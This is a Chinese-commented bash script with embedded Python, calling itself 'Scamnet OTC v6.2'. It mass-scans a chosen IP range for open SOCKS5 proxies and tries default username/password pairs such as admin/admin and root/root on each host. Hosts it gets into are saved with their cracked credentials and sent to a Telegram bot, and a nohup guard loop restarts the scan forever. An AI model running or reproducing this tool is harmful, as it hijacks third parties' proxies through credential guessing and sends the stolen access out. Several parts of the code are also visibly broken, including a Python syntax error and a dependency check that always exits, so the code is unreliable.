#!/bin/bash
# main.sh - Scamnet OTC v6.2（终极稳定版：修复 YAML 引号 + 所有功能）
set -euo pipefail
IFS=$'\n\t'

RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"
RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"

log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }

install_deps() {
    log "安装依赖..."
    PYTHON_CMD=$(command -v python3 || command -v python || err "未找到 Python"; exit 1)
    $PYTHON_CMD -m pip install --quiet --no-cache-dir --force-reinstall \
        aiohttp tqdm pyyaml requests || true
    touch .deps_installed
    succ "依赖完成"
}
[ ! -f ".deps_installed" ] && install_deps

# 输入
DEFAULT_START="157.254.32.0"
DEFAULT_END="157.254.52.255"
read_ip() { echo -e "${YELLOW}$1（默认: $2）:${NC}"; read -r input; eval "$3=\"\${input:-$2}\""; }
read_ip "起始 IP" "$DEFAULT_START" START_IP
read_ip "结束 IP" "$DEFAULT_END" END_IP

if ! [[ $START_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || ! [[ $END_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
    err "IP 格式错误"; exit 1
fi
if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP" ]; then
    err "起始 IP 必须 ≤ 结束 IP"; exit 1
fi
succ "范围: $START_IP - $END_IP"

echo -e "${YELLOW}端口（默认: 1080）:${NC}"
read -r PORT_INPUT; PORT_INPUT=${PORT_INPUT:-1080}
PORTS_CONFIG=""
if [[ $PORT_INPUT =~ ^[0-9]+-[0-9]+$ ]]; then
    PORTS_CONFIG="range: \"$PORT_INPUT\""
elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
    PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/","/g')
    PORTS_CONFIG="ports: [\"$PORT_LIST\"]"
else
    PORTS_CONFIG="ports: [$PORT_INPUT]"
fi
succ "端口: $PORT_INPUT"

echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
[[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }

# 生成独立脚本
cat > "$RUN_SCRIPT" << 'EOF'
#!/bin/bash
set -euo pipefail
cd "$(dirname "$0")"

ulimit -n 10240; ulimit -m $((1024*1024)); ulimit -v $((2*1024*1024))

START_IP="{{START_IP}}"
END_IP="{{END_IP}}"
PORTS_CONFIG='{{PORTS_CONFIG}}'
TELEGRAM_TOKEN="{{TELEGRAM_TOKEN}}"
TELEGRAM_CHATID="{{TELEGRAM_CHATID}}"

cat > config.yaml << CFG
input_range: "$START_IP-$END_IP"
$PORTS_CONFIG
timeout: 6.0
max_concurrent: 150
batch_size: 250
retry: 2
CFG

cat > scanner_batch.py << 'PY'
#!/usr/bin/env python3
import asyncio, aiohttp, yaml, sys, signal, os, requests
from tqdm import tqdm
from collections import defaultdict

signal.signal(signal.SIGTERM, lambda *_: os._exit(0))

if len(sys.argv) != 3: sys.exit(1)
start_idx, end_idx = int(sys.argv[1]), int(sys.argv[2])

with open('config.yaml') as f: cfg = yaml.safe_load(f)
input_range = cfg['input_range']
raw_ports = cfg.get('ports') or cfg.get('range')
timeout = cfg.get('timeout', 6.0)
max_concurrent = cfg.get('max_concurrent', 150)
retry = cfg.get('retry', 1)
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '')
TELEGRAM_CHATID = os.environ.get('TELEGRAM_CHATID', '')

def parse_ip_range(s):
    a, b = [x.strip().strip('"').strip("'") for x in s.split('-')]
    def ip_to_int(ip): return sum(int(x) << (24 - 8*i) for i, x in enumerate(ip.split('.')))
    start = ip_to_int(a)
    end = ip_to_int(b)
    return [f"{(start+i)>>24}.{(start+i)>>16&255}.{(start+i)>>8&255}.{(start+i)&255}" for i in range(end - start + 1)]

def parse_ports(p):
    if isinstance(p, str) and '-' in p: return list(range(*map(int, p.split('-'))))
    return [int(x) for x in p] if isinstance(p, list) else [int(p)]

ips = parse_ip_range(input_range)
ports = parse_ports(raw_ports)
all_tasks = [(ip, port) for ip in ips for port in ports]
batch = all_tasks[start_idx:end_idx]

WEAK_PAIRS = [("admin","admin"),("root","root"),("user","user"),("123","123"),("123456","123456"),("socks","socks")]

COUNTRY_CACHE = {}
async def get_country(ip, session):
    if ip in COUNTRY_CACHE: return COUNTRY_CACHE[ip]
    for url in [f"http://ip-api.com/json/{ip}?fields=countryCode", f"https://ipinfo.io/{ip}/country"]:
        try:
            async with session.get(url, timeout=4) as r:
                if r.status == 200:
                    code = (await r.text()).strip().upper()[:2]
                    if len(code) == 2 and code.isalpha():
                        COUNTRY_CACHE[ip] = code
                        return code
        except: pass
    COUNTRY_CACHE[ip] = "XX"
    return "XX"

def send_telegram(msg):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHATID: return
    try: requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                       data={"chat_id": TELEGRAM_CHATID, "text": msg, "parse_mode": "HTML"}, timeout=5)
    except: pass

async def test_socks5(ip, port, session, auth=None, attempt=0):
    proxy_url = f"socks5h://{ip}:{port}"
    proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
    try:
        async with session.get("https://httpbin.org/ip", proxy=proxy_url, proxy_auth=proxy_auth,
                               timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                data = await r.json()
                if data.get('origin'): return True, round(r.elapsed.total_seconds()*1000), data['origin']
    except:
        if attempt < retry: await asyncio.sleep(0.5); return await test_socks5(ip, port, session, auth, attempt+1)
    return False, 0, None

seen = set(); stats = defaultdict(int)

async def scan(ip, port):
    key = f"{ip}:{port}"
    if key in seen: return
    connector = aiohttp.TCPConnector(limit=8, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        ok, lat, exp = await test_socks5(ip, port, session)
        pair = None
        if not ok:
            for p in WEAK_PAIRS:
                ok, lat, exp = await test_socks5(ip, port, session, p)
                if ok: pair = p; break
        if ok and lat < 500:
            country = await get_country(exp if exp != ip else ip, session)
            auth = f"{pair[0]}:{pair[1]}" if pair else ""
            result = f"socks5://{auth}@{ip}:{port}#{country}".replace("@:", ":")
            seen.add(key)
            with open("socks5_valid.txt", "a") as f: f.write(result + "\n")
            stats[country] += 1
            print(f"[+] {result} ({lat}ms)")
            send_telegram(f"New: {result}<br>Delay: {lat}ms | {country}")
        else: seen.add(key)

async def main():
    sem = asyncio.Semaphore(max_concurrent)
    async def bound(ip, port): async with sem: await scan(ip, port)
    tasks = [bound(ip, port) for ip, port in batch]
    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc=f"Batch {start_idx}-{end_idx}"):
        await f
    if stats: send_telegram(f"Summary: {dict(stats)}")

try: asyncio.run(main())
except: pass
PY
chmod +x scanner_batch.py

# === 正确计算 TOTAL（处理引号）===
TOTAL=$(python3 - << 'PYC'
import yaml
with open('config.yaml') as f: cfg = yaml.safe_load(f)
s, e = [x.strip().strip('"').strip("'") for x in cfg['input_range'].split('-')]
def ip_to_int(ip): return sum(int(x) << (24 - 8*i) for i, x in enumerate(ip.split('.')))
start = ip_to_int(s); end = ip_to_int(e); ips = end - start + 1
p = cfg.get('ports') or cfg.get('range')
if isinstance(p, str) and '-' in p: ports = int(p.split('-')[1]) - int(p.split('-')[0]) + 1
elif isinstance(p, list): ports = len(p)
else: ports = 1
print(ips * ports)
PYC
)

[[ $TOTAL =~ ^[0-9]+$ ]] && [ "$TOTAL" -gt 0 ] || { echo "[!] TOTAL 计算失败"; exit 1; }

BATCH_SIZE=$(python3 -c "import yaml; print(yaml.safe_load(open('config.yaml')).get('batch_size',250))" 2>/dev/null || echo 250)
echo "[*] 总任务: $TOTAL | 每批: $BATCH_SIZE"

> socks5_valid.txt
echo "# Scamnet v6.2 - $(date)" > socks5_valid.txt

export TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
export TELEGRAM_CHATID="$TELEGRAM_CHATID"

for ((i=0; i<TOTAL; i+=BATCH_SIZE)); do
    end=$((i + BATCH_SIZE)); [ $end -gt $TOTAL ] && end=$TOTAL
    echo "[*] 批次 $i → $end"
    timeout 300 python3 scanner_batch.py $i $end || echo "[!] 超时"
done

if [ -s socks5_valid.txt ]; then
    sort -u socks5_valid.txt > temp && mv temp socks5_valid.txt
    COUNT=$(wc -l < socks5_valid.txt)
    python3 -c "
import os, requests
if os.environ.get('TELEGRAM_TOKEN'):
    requests.post(f'https://api.telegram.org/bot{os.environ[\"TELEGRAM_TOKEN\"]}/sendMessage',
                  data={'chat_id': os.environ['TELEGRAM_CHATID'], 'text': 'Scan done! $COUNT valid proxies'})" 2>/dev/null || true
fi

echo "[+] 完成 → socks5_valid.txt"
EOF

sed -i "s|{{START_IP}}|$START_IP|g; s|{{END_IP}}|$END_IP|g; s|{{PORTS_CONFIG}}|$PORTS_CONFIG|g; s|{{TELEGRAM_TOKEN}}|$TELEGRAM_TOKEN|g; s|{{TELEGRAM_CHATID}}|$TELEGRAM_CHATID|g" "$RUN_SCRIPT"
chmod +x "$RUN_SCRIPT"

# 守护进程
cat > "$LOG_DIR/scamnet_guard.sh" << 'GUARD'
#!/bin/bash
while :; do
    echo "[GUARD] $(date) - 启动..."
    bash "{{RUN_SCRIPT}}" 2>&1 | tee -a "{{LATEST_LOG}}"
    echo "[GUARD] 重启..."
    sleep 3
done
GUARD
sed -i "s|{{RUN_SCRIPT}}|$RUN_SCRIPT|g; s|{{LATEST_LOG}}|$LATEST_LOG|g" "$LOG_DIR/scamnet_guard.sh"
chmod +x "$LOG_DIR/scamnet_guard.sh"

pkill -f "scamnet_guard.sh" 2>/dev/null || true
nohup bash "$LOG_DIR/scamnet_guard.sh" > /dev/null 2>&1 &
succ "守护进程启动！PID: $!"
log "日志: tail -f $LATEST_LOG"
log "停止: pkill -f scamnet_guard.sh"
